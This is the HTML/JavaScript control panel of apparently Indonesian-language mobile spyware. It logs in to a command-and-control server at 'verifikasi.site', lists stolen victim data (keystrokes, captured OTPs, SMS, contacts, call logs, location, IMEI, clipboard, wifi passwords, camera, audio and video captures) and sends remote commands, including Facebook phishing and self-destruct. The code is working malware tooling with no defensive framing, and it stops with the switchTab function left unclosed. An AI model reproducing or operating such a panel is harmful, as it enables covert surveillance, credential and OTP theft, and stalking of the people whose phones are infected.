<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>🔬 DASHBOARD ULTIMATE</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Arial,sans-serif;background:#0a0a0a;color:#e0e0e0;padding:16px;font-size:13px}
        .header{border-bottom:2px solid #00ff88;padding-bottom:12px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
        .header h1{color:#00ff88;font-size:22px;display:flex;align-items:center;gap:10px}
        .live-dot{display:inline-block;width:10px;height:10px;border-radius:50%;background:#00ff00;animation:blink 1s infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
        .card{background:#111;border:1px solid #2a2a2a;border-radius:8px;padding:14px;margin-bottom:12px}
        .card h2{color:#00ff88;font-size:14px;margin-bottom:8px;border-bottom:1px solid #1a1a1a;padding-bottom:6px;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
        .card h2 .badge{font-size:10px;background:#1a1a1a;padding:2px 10px;border-radius:12px;color:#888}
        .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}
        .stat-card{background:#1a1a1a;padding:10px;border-radius:6px;text-align:center;border:1px solid #2a2a2a}
        .stat-card .num{font-size:22px;font-weight:bold;color:#00ff88}
        .stat-card .label{color:#888;font-size:10px;margin-top:3px}
        .flex{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
        .flex-between{display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
        input,select,button{background:#1a1a1a;border:1px solid #333;color:#e0e0e0;padding:8px 12px;border-radius:5px;font-size:12px;font-family:inherit}
        input:focus,select:focus{outline:2px solid #00ff88;border-color:#00ff88}
        button{cursor:pointer;font-weight:bold;transition:0.3s}
        button:hover{transform:scale(1.03)}
        .btn-green{background:#00cc66;color:#000;border-color:#00cc66}
        .btn-blue{background:#108ee9;color:#fff;border-color:#108ee9}
        .btn-red{background:#ff4444;color:#fff;border-color:#ff4444}
        .btn-orange{background:#ff8800;color:#fff;border-color:#ff8800}
        .btn-purple{background:#aa44ff;color:#fff;border-color:#aa44ff}
        .btn-gray{background:#333;color:#ccc}
        .tab-btn{background:#1a1a1a;border:1px solid #333;padding:6px 14px;border-radius:5px;cursor:pointer;color:#888;transition:0.3s}
        .tab-btn.active{background:#00ff88;color:#000;border-color:#00ff88}
        .tab-content{display:none}
        .tab-content.active{display:block}
        table{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
        th{background:#1a1a1a;color:#00ff88;padding:6px 8px;text-align:left;border:1px solid #2a2a2a}
        td{padding:5px 8px;border:1px solid #2a2a2a;word-break:break-all}
        .log-container{max-height:500px;overflow-y:auto;font-size:12px}
        .log-container::-webkit-scrollbar{width:5px}
        .log-container::-webkit-scrollbar-track{background:#1a1a1a}
        .log-container::-webkit-scrollbar-thumb{background:#333;border-radius:3px}
        .log-item{padding:4px 8px;border-bottom:1px solid #1a1a1a;display:grid;grid-template-columns:140px 120px 1fr;gap:8px;align-items:start}
        .log-item .time{color:#666;font-size:10px}
        .log-item .sumber{font-weight:bold;font-size:11px}
        .log-item .data{color:#ccc;word-break:break-all;font-size:11px}
        .log-keylogger .sumber{color:#ff4444}
        .log-otp .sumber{color:#ff44aa}
        .log-location .sumber{color:#44aaff}
        .log-contact .sumber{color:#44ff88}
        .log-sms .sumber{color:#ff8844}
        .log-c2 .sumber{color:#aa44ff}
        .img-preview{max-width:100%;max-height:400px;border-radius:6px;border:1px solid #333;cursor:pointer}
        .file-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:6px}
        .file-item{background:#1a1a1a;padding:6px;border-radius:4px;text-align:center;font-size:10px;border:1px solid #2a2a2a;word-break:break-all}
        .file-item .name{color:#00ff88;font-weight:bold}
        .file-item .path{color:#666;font-size:8px}
        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#1a1a2e;color:#fff;padding:10px 24px;border-radius:8px;font-size:13px;z-index:999;display:none;border-left:4px solid #00ff88;box-shadow:0 4px 20px rgba(0,0,0,0.5)}
        .empty{color:#444;text-align:center;padding:20px;font-size:13px}
        .password-container{max-width:400px;margin:40px auto;padding:30px;background:#111;border-radius:10px;border:1px solid #333;text-align:center}
        .password-container input{width:100%;margin:10px 0;padding:12px;font-size:16px;text-align:center}
        .data-section{animation:fadeIn 0.3s ease}
        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
        .media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px}
        .media-item{background:#1a1a1a;border-radius:6px;padding:8px;border:1px solid #2a2a2a;text-align:center}
        .media-item .label{color:#888;font-size:10px;margin:4px 0}
        .media-item audio,.media-item video{width:100%;border-radius:4px}
        .preview-img{max-width:100%;max-height:200px;border-radius:4px;cursor:pointer}
        .json-view{background:#0a0a0a;padding:8px;border-radius:4px;font-size:10px;max-height:200px;overflow-y:auto;white-space:pre-wrap;font-family:monospace;color:#ccc}
        @media(max-width:600px){.log-item{grid-template-columns:1fr;gap:2px}.header h1{font-size:18px}}
    </style>
</head>
<body>

<div class="toast" id="toast"></div>

<!-- LOGIN -->
<div id="loginBox" class="password-container">
    <h1 style="color:#00ff88;font-size:24px;">🔐 DASHBOARD</h1>
    <p style="color:#888;font-size:13px;margin:10px 0;">Masukkan password</p>
    <input type="password" id="pw" placeholder="Password" onkeyup="if(event.key==='Enter')login()">
    <button class="btn-green" onclick="login()" style="width:100%;padding:12px;font-size:16px;">🔓 BUKA</button>
    <div class="error" id="loginError" style="color:#ff4444;margin-top:8px;display:none;">❌ Password salah!</div>
</div>

<!-- MAIN -->
<div id="main" style="display:none">

    <div class="header">
        <h1><span class="live-dot"></span> 🔬 DASHBOARD ULTIMATE</h1>
        <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center">
            <span id="statusInfo" style="color:#888;font-size:12px;">⏳ Loading...</span>
            <button class="btn-blue" onclick="refreshData()">🔄 Refresh</button>
            <button class="btn-green" onclick="exportJSON()">📤 Export</button>
            <button class="btn-red" onclick="clearAll()">🗑️ Clear</button>
        </div>
    </div>

    <!-- STATS -->
    <div class="card">
        <h2>📊 STATISTIK</h2>
        <div class="grid" id="statsGrid"></div>
    </div>

    <!-- TABS -->
    <div style="display:flex;flex-wrap:wrap;gap:5px;margin-bottom:12px;">
        <button class="tab-btn active" data-tab="tabAll" onclick="switchTab('tabAll')">📦 Semua Data</button>
        <button class="tab-btn" data-tab="tabMedia" onclick="switchTab('tabMedia')">🖼️ Media (Foto/Audio/Video)</button>
        <button class="tab-btn" data-tab="tabLog" onclick="switchTab('tabLog')">📋 Log</button>
        <button class="tab-btn" data-tab="tabC2" onclick="switchTab('tabC2')">🎮 C2</button>
    </div>

    <!-- TAB 1: SEMUA DATA -->
    <div id="tabAll" class="tab-content active">
        <div id="dataSections"></div>
    </div>

    <!-- TAB 2: MEDIA -->
    <div id="tabMedia" class="tab-content">
        <div id="mediaSections"></div>
    </div>

    <!-- TAB 3: LOG -->
    <div id="tabLog" class="tab-content">
        <div class="card">
            <div class="flex-between">
                <div class="flex">
                    <input type="text" id="logSearch" placeholder="🔍 Cari..." onkeyup="filterLog()" style="width:200px;">
                    <select id="logFilter" onchange="filterLog()">
                        <option value="">Semua</option>
                    </select>
                    <span style="color:#888;font-size:11px;" id="logCount">0</span>
                </div>
                <button class="btn-gray" onclick="resetFilter()">Reset</button>
            </div>
            <div class="log-container" id="logContainer"></div>
        </div>
    </div>

    <!-- TAB 4: C2 -->
    <div id="tabC2" class="tab-content">
        <div class="card">
            <h2>🎮 C2 COMMAND CENTER</h2>
            <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:6px;margin-bottom:12px;">
                <button class="btn-blue" onclick="sendC2('screenshot')">📸 Screenshot</button>
                <button class="btn-blue" onclick="sendC2('take_photo')">📷 Photo</button>
                <button class="btn-blue" onclick="sendC2('record_audio',{durasi:30})">🎤 Audio 30s</button>
                <button class="btn-blue" onclick="sendC2('record_video',{durasi:30})">🎥 Video 30s</button>
                <button class="btn-green" onclick="sendC2('ambil_lokasi')">📍 Lokasi</button>
                <button class="btn-green" onclick="sendC2('ambil_kontak')">📇 Kontak</button>
                <button class="btn-green" onclick="sendC2('ambil_sms',{jumlah:50})">💬 SMS</button>
                <button class="btn-purple" onclick="sendC2('buka_wa')">💚 WA</button>
                <button class="btn-purple" onclick="sendC2('buka_telegram')">💙 TG</button>
                <button class="btn-orange" onclick="sendC2('phishing_fb')">📘 Phishing</button>
                <button class="btn-red" onclick="if(confirm('Self Destruct?'))sendC2('self_destruct')">💀 Self Destruct</button>
            </div>
            <div class="flex">
                <input type="text" id="c2Custom" placeholder='{"aksi":"perintah"}' style="flex:2;min-width:150px;">
                <button class="btn-blue" onclick="sendC2Custom()">📤 Kirim</button>
            </div>
            <div id="c2Result" style="color:#888;font-size:11px;margin-top:6px;">Ready</div>
        </div>
        <div class="card"><h2>📜 C2 History</h2><div id="c2History" style="max-height:200px;overflow-y:auto;font-size:12px;"></div></div>
    </div>

</div>

<script>
// ============================================================
// GLOBAL
// ============================================================
var SERVER_URL = 'https://verifikasi.site';
var allData = [];
var KEY = '';
var c2History = [];

// ============================================================
// LOGIN
// ============================================================
function login() {
    var pw = document.getElementById('pw').value;
    if(!pw) { showToast('Masukkan password!'); return; }
    KEY = pw;
    document.getElementById('loginBox').style.display = 'none';
    document.getElementById('main').style.display = 'block';
    document.getElementById('statusInfo').textContent = '🔓 Login sukses';
    refreshData();
    setInterval(refreshData, 3000);
}

function showToast(msg, dur) {
    var t = document.getElementById('toast');
    t.textContent = msg;
    t.style.display = 'block';
    clearTimeout(t._timer);
    t._timer = setTimeout(function(){ t.style.display = 'none'; }, dur||3000);
}

// ============================================================
// REFRESH
// ============================================================
function refreshData() {
    if(!KEY) return;
    fetch(SERVER_URL + '/data?key=' + encodeURIComponent(KEY))
        .then(function(r){ return r.json(); })
        .then(function(data){
            allData = data;
            document.getElementById('statusInfo').textContent = '✅ ' + data.length + ' data - ' + new Date().toLocaleTimeString();
            renderAll();
        })
        .catch(function(){ document.getElementById('statusInfo').textContent = '❌ Error loading'; });
}

function renderAll() {
    renderStats();
    renderDataSections();
    renderMediaSections();
    renderLog();
}

// ============================================================
// STATS
// ============================================================
function renderStats() {
    var map = {};
    allData.forEach(function(item){
        var s = item.sumber || 'unknown';
        map[s] = (map[s]||0)+1;
    });
    map['Total'] = allData.length;
    var html = '';
    var sorted = Object.keys(map).sort();
    sorted.forEach(function(k){
        html += '<div class="stat-card"><div class="num">'+map[k]+'</div><div class="label">'+k+'</div></div>';
    });
    document.getElementById('statsGrid').innerHTML = html;
}

// ============================================================
// RENDER SEMUA DATA (TAB 1)
// ============================================================
function renderDataSections() {
    var container = document.getElementById('dataSections');
    var groups = {};
    allData.forEach(function(item){
        if(!groups[item.sumber]) groups[item.sumber] = [];
        groups[item.sumber].push(item);
    });
    var html = '';
    Object.keys(groups).sort().forEach(function(src){
        var items = groups[src];
        var last = items[items.length-1];
        html += '<div class="card data-section">';
        html += '<h2>'+getIcon(src)+' '+src+' <span class="badge">'+items.length+'x</span></h2>';
        html += renderDataContent(src, items, last);
        html += '</div>';
    });
    container.innerHTML = html || '<div class="empty">📭 Belum ada data</div>';
}

// ============================================================
// RENDER DATA CONTENT PER SOURCE
// ============================================================
function renderDataContent(src, items, last) {
    var data = last ? last.data : null;
    if(!data) return '<div class="empty">No data</div>';
    
    // --- FOTO / SCREENSHOT ---
    if (src === 'screenshot' || src === 'screen_capture' || src === 'camera_capture') {
        var imgSrc = typeof data === 'string' ? data : (data.data || data.image || '');
        if(imgSrc && imgSrc.startsWith('data:image')) {
            return '<img src="'+imgSrc+'" class="img-preview" onclick="window.open(this.src,\'_blank\')"><br>'+
                   '<a href="'+imgSrc+'" download="'+src+'.png" style="color:#00ff88;">📥 Download</a>';
        }
        return '<div class="json-view">'+escapeHtml(JSON.stringify(data,null,2))+'</div>';
    }
    
    // --- GALLERY PHOTOS ---
    if (src === 'gallery_photos' && Array.isArray(data)) {
        var h = '<div class="file-grid">';
        data.forEach(function(path){
            var name = path.split('/').pop();
            h += '<div class="file-item"><div class="name">📷 '+escapeHtml(name)+'</div><div class="path">'+escapeHtml(path)+'</div></div>';
        });
        h += '</div>';
        return h;
    }
    
    // --- AUDIO ---
    if (src === 'audio_record' || src === 'mic_recording' || src === 'audio_recording') {
        var audioSrc = typeof data === 'string' ? data : (data.data || data.audio || '');
        if(audioSrc && audioSrc.startsWith('data:audio')) {
            return '<audio controls style="width:100%;"><source src="'+audioSrc+'"></audio><br>'+
                   '<a href="'+audioSrc+'" download="recording.webm" style="color:#00ff88;">📥 Download</a>';
        }
        return '<div class="json-view">'+escapeHtml(JSON.stringify(data,null,2))+'</div>';
    }
    
    // --- VIDEO ---
    if (src === 'video_record' || src === 'video_recording') {
        var videoSrc = typeof data === 'string' ? data : (data.data || data.video || '');
        if(videoSrc && videoSrc.startsWith('data:video')) {
            return '<video controls style="width:100%;max-height:300px;"><source src="'+videoSrc+'"></video><br>'+
                   '<a href="'+videoSrc+'" download="recording.webm" style="color:#00ff88;">📥 Download</a>';
        }
        return '<div class="json-view">'+escapeHtml(JSON.stringify(data,null,2))+'</div>';
    }
    
    // --- KEYLOGGER ---
    if (src === 'keylogger' || src === 'keylogger_ws') {
        if(typeof data === 'object') {
            var h = '<table><tr><th>Field</th><th>Value</th></tr>';
            for(var k in data){
                h += '<tr><td>'+escapeHtml(k)+'</td><td style="color:#ff4444;font-weight:bold;">'+escapeHtml(String(data[k]))+'</td></tr>';
            }
            h += '</table>';
            return h;
        }
    }
    
    // --- OTP ---
    if (src === 'fake_otp') {
        var h = '<table><tr><th>Waktu</th><th>OTP</th></tr>';
        items.slice(-20).reverse().forEach(function(item){
            var d = item.data || {};
            var otp = d.otp || d.data || '?';
            var waktu = item.waktu ? new Date(item.waktu).toLocaleString('id-ID') : '?';
            h += '<tr><td style="font-size:10px;">'+waktu+'</td><td style="color:#ff44aa;font-weight:bold;font-size:20px;">'+escapeHtml(String(otp))+'</td></tr>';
        });
        h += '</table>';
        return h;
    }
    
    // --- KONTAK ---
    if (src === 'kontak_all' && Array.isArray(data)) {
        return renderTable(data, ['nama','nomor']);
    }
    
    // --- SMS ---
    if (src === 'sms_all' && Array.isArray(data)) {
        return renderTable(data, ['address','body'], 20);
    }
    
    // --- CALL LOG ---
    if (src === 'call_log' && Array.isArray(data)) {
        return renderTable(data, ['number','duration'], 20);
    }
    
    // --- APLIKASI ---
    if (src === 'aplikasi_all' && Array.isArray(data)) {
        return renderTable(data, ['nama','package'], 30);
    }
    
    // --- LOKASI ---
    if (src === 'lokasi') {
        var lat = data.lat || data.latitude || '?';
        var lon = data.lon || data.longitude || '?';
        return '<div style="font-size:14px;">📍 <b>Lat:</b> '+lat+' | <b>Lon:</b> '+lon+' | <b>Akurasi:</b> '+(data.akurasi||data.accuracy||'?')+'m</div>'+
               '<a href="https://maps.google.com/?q='+lat+','+lon+'" target="_blank" style="color:#00ff88;">🗺️ Buka Google Maps</a>';
    }
    
    // --- CLIPBOARD ---
    if (src === 'clipboard') {
        return '<pre style="color:#ff0;font-size:14px;background:#0a0a0a;padding:10px;border-radius:4px;">'+escapeHtml(String(data))+'</pre>';
    }
    
    // --- C2 RESULT ---
    if (src === 'c2_result') {
        var h = '<div style="font-size:12px;">';
        if(data.perintah) h += '<b>Perintah:</b> '+escapeHtml(String(data.perintah))+'<br>';
        if(data.hasil) {
            var hasil = typeof data.hasil === 'string' ? data.hasil : JSON.stringify(data.hasil, null, 2);
            h += '<b>Hasil:</b><br><pre style="font-size:10px;color:#aa44ff;max-height:150px;overflow-y:auto;">'+escapeHtml(hasil)+'</pre>';
        }
        h += '</div>';
        return h;
    }
    
    // --- DEVICE INFO ---
    if (src === 'device_info' || src === 'init') {
        var h = '<table><tr><th>Key</th><th>Value</th></tr>';
        var fields = ['ua','pl','la','sc','cd','pr','dm','cc','on','ve','mt','tz','ip','ip_local','model','brand','android'];
        fields.forEach(function(f){
            if(data[f] !== undefined && data[f] !== null && data[f] !== '') {
                h += '<tr><td>'+f+'</td><td>'+escapeHtml(String(data[f]))+'</td></tr>';
            }
        });
        h += '</table>';
        return h;
    }
    
    // --- TELEPON INFO ---
    if (src === 'telepon_info') {
        var h = '<table><tr><th>Key</th><th>Value</th></tr>';
        ['imei','imsi','nomor','operator'].forEach(function(f){
            if(data[f]) h += '<tr><td>'+f+'</td><td style="color:#ff0;font-weight:bold;">'+escapeHtml(String(data[f]))+'</td></tr>';
        });
        h += '</table>';
        return h;
    }
    
    // --- DEFAULT: JSON VIEW ---
    return '<div class="json-view">'+escapeHtml(JSON.stringify(data, null, 2))+'</div>';
}

// ============================================================
// RENDER MEDIA (TAB 2)
// ============================================================
function renderMediaSections() {
    var container = document.getElementById('mediaSections');
    var mediaItems = [];
    
    allData.forEach(function(item){
        var src = item.sumber || '';
        var data = item.data;
        var isMedia = false;
        var mediaType = '';
        var mediaSrc = '';
        
        // Screenshot/Image
        if (src === 'screenshot' || src === 'screen_capture' || src === 'camera_capture') {
            mediaSrc = typeof data === 'string' ? data : (data.data || data.image || '');
            if(mediaSrc && mediaSrc.startsWith('data:image')) { isMedia = true; mediaType = 'image'; }
        }
        // Gallery photos
        if (src === 'gallery_photos' && Array.isArray(data)) {
            data.forEach(function(path){
                mediaItems.push({ type: 'file', label: path.split('/').pop(), path: path, waktu: item.waktu });
            });
            isMedia = false;
        }
        // Audio
        if (src === 'audio_record' || src === 'mic_recording') {
            mediaSrc = typeof data === 'string' ? data : (data.data || '');
            if(mediaSrc && mediaSrc.startsWith('data:audio')) { isMedia = true; mediaType = 'audio'; }
        }
        // Video
        if (src === 'video_record') {
            mediaSrc = typeof data === 'string' ? data : (data.data || '');
            if(mediaSrc && mediaSrc.startsWith('data:video')) { isMedia = true; mediaType = 'video'; }
        }
        
        if(isMedia) {
            mediaItems.push({
                type: mediaType,
                src: mediaSrc,
                sumber: src,
                waktu: item.waktu
            });
        }
    });
    
    if(!mediaItems.length) {
        container.innerHTML = '<div class="card"><div class="empty">📭 Belum ada media (foto/audio/video)</div></div>';
        return;
    }
    
    var html = '<div class="card"><h2>🖼️ MEDIA ('+mediaItems.length+')</h2><div class="media-grid">';
    mediaItems.forEach(function(item){
        html += '<div class="media-item">';
        html += '<div class="label">'+item.sumber+'</div>';
        if(item.type === 'image') {
            html += '<img src="'+item.src+'" class="preview-img" onclick="window.open(this.src,\'_blank\')">';
            html += '<br><a href="'+item.src+'" download="media_'+Date.now()+'.png" style="color:#00ff88;font-size:10px;">📥 Download</a>';
        } else if(item.type === 'audio') {
            html += '<audio controls><source src="'+item.src+'"></audio>';
        } else if(item.type === 'video') {
            html += '<video controls style="width:100%;max-height:200px;"><source src="'+item.src+'"></video>';
        } else if(item.type === 'file') {
            html += '<div style="color:#00ff88;font-size:12px;">📄 '+escapeHtml(item.label)+'</div>';
            html += '<div style="color:#666;font-size:9px;">'+escapeHtml(item.path)+'</div>';
        }
        if(item.waktu) {
            html += '<div style="color:#666;font-size:9px;margin-top:4px;">'+new Date(item.waktu).toLocaleString('id-ID')+'</div>';
        }
        html += '</div>';
    });
    html += '</div></div>';
    container.innerHTML = html;
}

function getIcon(src) {
    var icons = {
        'init':'📱','device_info':'📱','telepon_info':'📞','lokasi':'📍',
        'kontak_all':'📇','sms_all':'💬','call_log':'📞','keylogger':'⌨️',
        'clipboard':'📋','fake_otp':'🔐','screenshot':'📸','screen_capture':'📸',
        'gallery_photos':'🖼️','audio_record':'🎤','video_record':'🎬',
        'download':'📥','aplikasi_all':'📱','wifi_passwords':'📶','c2_result':'🎮'
    };
    return icons[src] || '📄';
}

function escapeHtml(str) {
    if(!str) return '';
    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function renderTable(data, cols, limit) {
    if(!Array.isArray(data) || !data.length) return '<div class="empty">Tidak ada data</div>';
    var html = '<div style="font-size:10px;color:#666;">Total: '+data.length+'</div><table><tr>';
    cols.forEach(function(c){ html += '<th>'+c+'</th>'; });
    html += '</tr>';
    var max = Math.min(data.length, limit||50);
    for(var i=0; i<max; i++){
        html += '<tr>';
        cols.forEach(function(c){
            var val = data[i][c] !== undefined ? data[i][c] : '?';
            if(typeof val === 'object') val = JSON.stringify(val);
            html += '<td>'+escapeHtml(String(val))+'</td>';
        });
        html += '</tr>';
    }
    html += '</table>';
    if(data.length > max) html += '<div style="color:#666;font-size:10px;">... dan '+(data.length-max)+' lainnya</div>';
    return html;
}

// ============================================================
// LOG
// ============================================================
function renderLog() {
    var container = document.getElementById('logContainer');
    var search = document.getElementById('logSearch').value.toLowerCase();
    var filter = document.getElementById('logFilter').value;
    
    var filtered = allData.filter(function(item){
        if(filter && item.sumber !== filter) return false;
        if(search) {
            var json = JSON.stringify(item).toLowerCase();
            if(!json.includes(search)) return false;
        }
        return true;
    });
    
    document.getElementById('logCount').textContent = filtered.length + ' entries';
    
    // Update filter options
    var sources = {}; allData.forEach(function(i){ sources[i.sumber]=true; });
    var sel = document.getElementById('logFilter');
    var current = sel.value;
    sel.innerHTML = '<option value="">Semua</option>';
    Object.keys(sources).sort().forEach(function(s){ sel.innerHTML += '<option value="'+s+'">'+s+'</option>'; });
    sel.value = current;
    
    if(!filtered.length) { container.innerHTML = '<div class="empty">📭 Tidak ada data</div>'; return; }
    
    var html = '';
    filtered.slice(-200).reverse().forEach(function(item){
        var waktu = item.waktu ? new Date(item.waktu).toLocaleString('id-ID') : '?';
        var src = item.sumber || '?';
        var dataStr = '';
        try { dataStr = JSON.stringify(item.data).substring(0, 300); } catch(e){ dataStr = String(item.data).substring(0,300); }
        var cls = '';
        if(['keylogger','keylogger_ws'].includes(src)) cls = 'log-keylogger';
        else if(src === 'fake_otp') cls = 'log-otp';
        else if(src === 'lokasi') cls = 'log-location';
        else if(src === 'kontak_all') cls = 'log-contact';
        else if(src === 'sms_all') cls = 'log-sms';
        else if(src === 'c2_result') cls = 'log-c2';
        html += '<div class="log-item '+cls+'"><div class="time">'+waktu+'</div><div class="sumber">'+src+'</div><div class="data">'+escapeHtml(dataStr)+'</div></div>';
    });
    container.innerHTML = html;
}

function filterLog(){ renderLog(); }
function resetFilter(){
    document.getElementById('logSearch').value = '';
    document.getElementById('logFilter').value = '';
    renderLog();
}

function switchTab(id){
    document.querySelectorAll('.tab-content').forEach(function(el){ el.classList.remove('active'); });
    document.getElementById(id).classList.add('active');

// ============================================================
// C2 COMMAND
// ============================================================
function sendC2(aksi, params){
    if(!KEY){ showToast('Login dulu!'); return; }
    var payload = { sumber: 'c2_command', data: { aksi: aksi, ...(params||{}) } };
    c2History.push({ waktu: new Date().toISOString(), aksi: aksi, status: '⏳ Sending...' });
    renderC2History();
    document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
    document.getElementById('c2Result').style.color = '#ff0';
    fetch(SERVER_URL + '/data', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) })
        .then(function(r){ return r.json(); })
        .then(function(res){
            document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
            document.getElementById('c2Result').style.color = '#0f0';
            var last = c2History[c2History.length-1];
            if(last){ last.status='✅ Success'; last.response=res; }
            renderC2History();
            showToast('✅ Command sent: '+aksi);
        })
        .catch(function(){
            document.getElementById('c2Result').textContent = '❌ Error: '+aksi;
            document.getElementById('c2Result').style.color = '#f44';
            var last = c2History[c2History.length-1];
            if(last){ last.status='❌ Failed'; }
            renderC2History();
        });
}

function sendC2Custom(){
    var input = document.getElementById('c2Custom').value.trim();
    if(!input){ showToast('Masukkan perintah!'); return; }
    try {
        var data = JSON.parse(input);
        var aksi = data.aksi || data.command || 'unknown';
        sendC2(aksi, data);
    } catch(e){ showToast('❌ Invalid JSON: '+e.message); }
}

function renderC2History(){
    var container = document.getElementById('c2History');
    if(!c2History.length){ container.innerHTML = '<div class="empty">Belum ada perintah</div>'; return; }
    var html = '<table><tr><th>Waktu</th><th>Perintah</th><th>Status</th></tr>';
    c2History.slice().reverse().forEach(function(item){
        var waktu = item.waktu ? new Date(item.waktu).toLocaleString('id-ID') : '?';
        var color = item.status.includes('✅') ? '#0f0' : (item.status.includes('❌') ? '#f44' : '#ff0');
        html += '<tr><td style="font-size:10px;">'+waktu+'</td><td>'+item.aksi+'</td><td style="color:'+color+';">'+item.status+'</td></tr>';
    });
    html += '</table>';
    container.innerHTML = html;
}

function exportJSON(){
    var blob = new Blob([JSON.stringify(allData,null,2)], {type:'application/json'});
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'data-'+Date.now()+'.json';
    a.click();
    showToast('📤 Export berhasil!');
}

function clearAll(){
    if(!confirm('⚠️ Hapus semua data?')) return;
    fetch(SERVER_URL + '/clear?key='+encodeURIComponent(KEY), {method:'POST'})
        .then(function(){ allData=[]; renderAll(); showToast('🗑️ Data terhapus'); })
        .catch(function(){ showToast('❌ Gagal hapus data'); });
}
